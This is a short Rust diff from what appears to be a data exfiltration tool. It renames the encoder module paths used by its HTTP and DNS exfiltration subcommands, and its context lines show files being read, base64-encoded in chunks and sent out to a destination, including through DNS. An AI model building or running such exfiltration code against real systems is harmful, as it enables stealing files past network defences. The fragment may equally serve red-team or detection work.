@@ -68,7 +68,7 @@ impl CommandHandler for HTTPExfiltrationSubCommand {
         self.files_path.iter().for_each(|file_path| {
             println!("[*] Reading file {}", file_path.to_string_lossy());
 
-            crate::encoder::b64_encode_file(&file_path, self.chunks as usize)
+            crate::encoders::http::b64_encode_file(&file_path, self.chunks as usize)
                 .iter()
                 .inspect(|payload_chunk| println!("[*] Sending chunk: {}", payload_chunk))
                 .for_each(|payload_chunk| {
@@ -150,7 +150,7 @@ impl CommandHandler for DNSExfiltrationSubCommand {
         println!("[*] Reading file {}", self.file_path.to_string_lossy());
         println!("[*] Encoding payload.");
         let payload_chunks =
-            crate::encoder::dns_safe_b64_encode_payload(&self.file_path, &self.destination);
+            crate::encoders::dns::encode_payload_dns_safe(&self.file_path, &self.destination);
 
         let resolver_config = match self.nameserver {
             Some(name_server) => {
